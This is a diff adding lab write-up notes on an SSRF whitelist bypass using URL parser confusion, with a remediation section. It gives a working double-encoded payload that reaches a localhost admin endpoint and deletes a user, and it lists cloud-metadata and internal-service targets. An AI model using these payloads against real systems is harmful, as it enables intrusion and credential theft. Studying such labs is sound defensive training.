@@ -963,3 +963,716 @@ Look for:
 Blind SSRF is detected using OAST tools like Burp Collaborator by injecting controlled URLs into headers such as **Referer** and observing DNS/HTTP callbacks. Even without responses, attackers can pivot into internal networks, cloud metadata services, or internal admin panels.
 
 ---
+
+# 🧠Lab-6 SSRF Whitelist Bypass via URL Parser Confusion
+
+---
+
+## 🔵 OVERVIEW
+
+This lab demonstrates:
+
+- SSRF (Server-Side Request Forgery)
+- URL parser confusion
+- Whitelist bypass
+- Embedded credentials abuse
+- Double URL encoding tricks
+
+The application contains:
+
+- stock check functionality
+- hostname whitelist validation
+
+BUT:
+
+different parsers interpret the URL differently.
+
+This allows attacker to:
+
+- bypass whitelist validation
+- force server to access localhost
+- access hidden admin functionality
+- delete user: carlos
+
+---
+
+## 🔵 WHAT IS THE TOPIC?
+
+### SSRF — Server-Side Request Forgery
+
+---
+
+### Simple Definition
+
+SSRF happens when:
+
+attacker tricks server into making requests
+to locations attacker chooses.
+
+---
+
+### Normal Web Flow
+
+```text
+Browser → Website → External Resource
+```
+
+---
+
+### SSRF Flow
+
+```text
+Attacker input
+        ↓
+Server processes attacker URL
+        ↓
+Server sends request internally
+        ↓
+Access internal/private resources
+```
+
+---
+
+### Real-Life Analogy
+
+Imagine:
+
+a restricted building only employees can enter.
+
+Attacker tricks employee into:
+
+opening restricted room for them.
+
+The server becomes:
+
+attacker’s internal proxy.
+
+---
+
+## 🔵 WHY SSRF IS DANGEROUS
+
+Servers can usually access:
+
+| Target | Purpose |
+|---|---|
+| localhost | internal admin panels |
+| 127.0.0.1 | loopback services |
+| cloud metadata | AWS/GCP credentials |
+| Redis/MongoDB | internal databases |
+| Docker APIs | container compromise |
+
+Attackers normally cannot access these directly.
+
+---
+
+# 🧠 IMPORTANT THEORY FOR THIS LAB
+
+---
+
+## Hostname Whitelist Defense
+
+Developer tries to secure requests using:
+
+```text
+stock.weliketoshop.net
+```
+
+Only this hostname is allowed.
+
+BUT:
+
+validation parser
+and
+execution parser
+
+interpret the URL differently.
+
+This creates:
+
+👉 parser confusion vulnerability
+
+---
+
+# 🔵 IMPORTANT URL THEORY
+
+---
+
+## Normal URL Structure
+
+```text
+http://website.com/page
+```
+
+---
+
+## URLs Can Contain Credentials
+
+Format:
+
+```text
+http://username:password@host
+```
+
+Example:
+
+```text
+http://admin:123@google.com
+```
+
+---
+
+### Meaning
+
+| Part | Meaning |
+|---|---|
+| admin | username |
+| 123 | password |
+| google.com | actual host |
+
+---
+
+## Important Concept
+
+Everything BEFORE:
+
+```text
+@
+```
+
+is treated as:
+
+👉 credentials
+
+NOT hostname.
+
+---
+
+# 🔵 WHAT IS URL FRAGMENT (#)?
+
+Example:
+
+```text
+http://site.com/page#test
+```
+
+---
+
+### Meaning
+
+| Part | Meaning |
+|---|---|
+| http://site.com/page | actual request |
+| #test | fragment |
+
+---
+
+### Important Rule
+
+Fragments are usually:
+
+❌ NOT sent to server
+
+They are processed client-side.
+
+---
+
+# 🔵 WHAT IS URL ENCODING?
+
+Special characters become encoded.
+
+Examples:
+
+| Character | Encoded |
+|---|---|
+| # | %23 |
+| space | %20 |
+
+---
+
+## Double Encoding
+
+Encoding an already encoded value.
+
+Example:
+
+```text
+# → %23 → %2523
+```
+
+because:
+
+```text
+% → %25
+```
+
+---
+
+## WHY DOUBLE ENCODING MATTERS
+
+Some systems:
+
+- validate BEFORE decoding
+- decode AGAIN internally
+
+This creates:
+
+different interpretations
+between validation and execution.
+
+---
+
+# 🔵 LAB THEORY
+
+Application:
+
+- validates hostname first
+- decodes URL differently later
+
+Attacker abuses this mismatch.
+
+---
+
+# 🔵 LAB WALKTHROUGH (STEP-BY-STEP)
+
+---
+
+## ✅ Step 1 — Open Product
+
+Visit any product page.
+
+Click:
+
+```text
+Check stock
+```
+
+---
+
+## ✅ Step 2 — Intercept Request
+
+Capture request in Burp Suite.
+
+Send to:
+
+```text
+Repeater
+```
+
+---
+
+### Original Parameter
+
+```text
+stockApi=http://stock.weliketoshop.net/product/stock/check?productId=1
+```
+
+---
+
+## ✅ Step 3 — Test localhost
+
+Replace URL with:
+
+```text
+http://127.0.0.1/
+```
+
+---
+
+### Purpose
+
+Testing whether:
+
+server can access localhost.
+
+---
+
+### Result
+
+Blocked.
+
+Meaning:
+
+hostname whitelist exists.
+
+---
+
+## ✅ Step 4 — Test Embedded Credentials
+
+Use:
+
+```text
+http://username@stock.weliketoshop.net/
+```
+
+---
+
+### Breaking It Down
+
+| Part | Meaning |
+|---|---|
+| username | fake credential |
+| @ | credential separator |
+| stock.weliketoshop.net | hostname |
+
+---
+
+### Result
+
+Accepted.
+
+This reveals:
+
+👉 parser supports credential syntax
+
+Very important clue.
+
+---
+
+## ✅ Step 5 — Test Fragment Character
+
+Use:
+
+```text
+http://username#@stock.weliketoshop.net/
+```
+
+---
+
+### Result
+
+Rejected.
+
+Meaning:
+
+```text
+#
+```
+
+changes parser behavior.
+
+---
+
+## ✅ Step 6 — Use Double Encoding
+
+Payload:
+
+```text
+http://localhost:80%2523@stock.weliketoshop.net/
+```
+
+---
+
+## 🧠 PAYLOAD BREAKDOWN
+
+| Part | Meaning |
+|---|---|
+| localhost | real target |
+| :80 | HTTP port |
+| %2523 | double-encoded # |
+| @ | parser confusion |
+| stock.weliketoshop.net | fake whitelist hostname |
+
+---
+
+## 🧠 VALIDATION PHASE
+
+Whitelist parser sees:
+
+```text
+stock.weliketoshop.net
+```
+
+✅ Allowed.
+
+---
+
+## 🧠 EXECUTION PHASE
+
+Internal decoding occurs:
+
+```text
+%2523 → %23 → #
+```
+
+URL conceptually becomes:
+
+```text
+http://localhost:80#@stock.weliketoshop.net/
+```
+
+---
+
+## IMPORTANT RESULT
+
+Everything after:
+
+```text
+#
+```
+
+becomes fragment.
+
+Ignored during request.
+
+---
+
+## REAL TARGET
+
+```text
+localhost:80
+```
+
+💥 SSRF successful.
+
+---
+
+## ✅ Step 7 — Final Exploit Payload
+
+```text
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+```
+
+---
+
+## 📸 Screenshot
+
+![final-ssrf-payload](../images/final-ssrf-localhost-admin-delete-carlos.png)
+
+---
+
+# 🔥 FINAL PAYLOAD BREAKDOWN
+
+| Part | Purpose |
+|---|---|
+| localhost | actual target |
+| :80 | HTTP port |
+| %2523 | encoded fragment |
+| @ | parser confusion |
+| stock.weliketoshop.net | whitelist bypass |
+| /admin/delete | admin endpoint |
+| ?username=carlos | delete victim |
+
+---
+
+# 🔵 EXECUTION FLOW
+
+---
+
+## Step 1
+
+Whitelist validation checks:
+
+```text
+stock.weliketoshop.net
+```
+
+✅ passes.
+
+---
+
+## Step 2
+
+URL internally decoded.
+
+```text
+%2523 → #
+```
+
+---
+
+## Step 3
+
+Fragment behavior activates.
+
+Everything after:
+
+```text
+#
+```
+
+ignored.
+
+---
+
+## Step 4
+
+Server requests:
+
+```text
+http://localhost/admin/delete?username=carlos
+```
+
+---
+
+## Step 5
+
+Admin functionality executes.
+
+Carlos deleted.
+
+💥 Lab solved.
+
+---
+
+# 🔵 VISUAL FLOW
+
+```text
+Attacker payload
+        ↓
+Whitelist parser fooled
+        ↓
+Internal decoding occurs
+        ↓
+Fragment truncates hostname
+        ↓
+Request sent to localhost
+        ↓
+Internal admin endpoint accessed
+        ↓
+Carlos deleted
+```
+
+---
+
+# 🔵 REAL-WORLD SCENARIOS
+
+---
+
+## ☁️ Cloud Metadata Theft
+
+```text
+http://169.254.169.254/
+```
+
+Steal:
+
+- AWS credentials
+- IAM tokens
+
+---
+
+## 🛠 Internal Admin Panels
+
+Access:
+
+```text
+localhost/admin
+```
+
+---
+
+## ☸️ Kubernetes Attacks
+
+Target:
+
+internal Kubernetes APIs.
+
+---
+
+## 🗄 Redis Exploitation
+
+Connect to:
+
+```text
+127.0.0.1:6379
+```
+
+---
+
+## 🔍 Internal Port Scanning
+
+Use SSRF to discover:
+
+- hidden services
+- internal ports
+- private APIs
+
+---
+
+# 🔵 HIGH-VALUE ENDPOINTS
+
+Common SSRF sinks:
+
+```text
+POST /stock
+POST /fetch
+POST /import
+POST /webhook
+GET /proxy?url=
+POST /image-fetch
+POST /url-preview
+```
+
+---
+
+# 🔵 IMPORTANT MENTAL MODEL
+
+Whitelist parser
+and
+request parser
+
+interpret URL differently.
+
+That mismatch creates:
+
+👉 SSRF whitelist bypass
+
+---
+
+# 🔵 REMEDIATION
+
+---
+
+## Proper URL Parsing
+
+Use:
+
+same parser everywhere
+
+for:
+
+- validation
+- request execution
+
+---
+
+## Disable Dangerous URL Features
+
+Reject:
+
+- embedded credentials
+- fragments
+- malformed encodings
+
+---
+
+## Normalize URLs First
+
+Decode before validating.
+
+---
+
+## Strict Allowlist Validation
+
+Validate:
+
+- resolved IP
+- final destination
+- redirects
+
+---
+
+## Block Internal Targets
+
+Reject:
+
+- localhost
+- 127.0.0.1
+- internal IP ranges
+- cloud metadata IPs
+
+---
+
+# 🔵 ONE-LINE SUMMARY
+
+👉 “This lab exploits SSRF by abusing URL parser confusion using embedded credentials and double-encoded fragments to bypass hostname whitelist validation and force the server to access localhost admin functionality.”
